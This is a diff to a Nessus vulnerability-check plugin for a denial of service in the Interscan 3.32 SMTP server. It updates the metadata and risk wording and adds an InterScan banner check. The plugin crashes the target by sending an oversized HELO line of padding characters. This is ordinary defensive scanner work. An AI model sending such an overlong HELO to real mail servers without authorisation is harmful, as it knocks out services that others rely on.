@@ -11,9 +11,9 @@
 if(description)
 {
  script_id(10353);
- script_version ("$Revision: 1.12 $");
- script_cve_id("CAN-1999-1529");
  script_bugtraq_id(787);
+ script_version ("$Revision: 1.17 $");
+ script_cve_id("CVE-1999-1529");
  name["english"] = "Interscan 3.32 SMTP Denial";
  name["francais"] = "Déni de service contre le serveur SMTP Interscan 3.32";
  script_name(english:name["english"], francais:name["francais"]);
@@ -27,7 +27,7 @@ your Interscan SMTP server from handling requests.
 
 Solution : contact your vendor for a patch.
 
-Risk factor : Serious";
+Risk factor : High";
 
  desc["francais"] = "Il s'est avéré possible
 de créer un déni de service sur le serveur
@@ -41,7 +41,7 @@ les requetes SMTP.
 Solution : contactez votre vendeur pour un
 patch.
 
-Facteur de risque : Serieux";
+Facteur de risque : Elevé";
 
 
  script_description(english:desc["english"], francais:desc["francais"]);
@@ -73,6 +73,10 @@ port = get_kb_item("Services/smtp");
 if(!port)port = 25;
 if(!get_port_state(port))exit(0);
 
+banner = get_smtp_banner (port:port);
+if ("InterScan" >!< banner)
+  exit (0);
+
  soc = open_sock_tcp(port);
  if(soc)
  {
@@ -83,7 +87,7 @@ if(!get_port_state(port))exit(0);
    send(socket:soc, data:c);
    s = recv_line(socket:soc, length:5000);
    if(!s)exit(0);
-   c = string("HELO ", crap(length:4090, data:"."),"\r\n");
+   c = string("HELO ", crap(length:4075, data:"."),"\r\n");
    send(socket:soc, data:c);
    s = recv_line(socket:soc, length:5000);
    if(!s) { security_hole(port); exit(0) ; }
